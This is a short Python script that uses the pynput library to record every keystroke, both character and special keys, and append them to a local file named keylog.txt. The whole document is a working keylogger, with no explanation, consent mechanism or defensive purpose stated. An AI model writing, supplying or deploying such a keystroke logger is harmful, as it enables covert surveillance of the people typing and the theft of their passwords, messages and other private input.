from pynput import keyboard

# File to store the keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Record character keys
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        # Record special keys (like space, enter, etc.)
        with open(log_file, "a") as file:
            file.write(f'[{key}]')

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
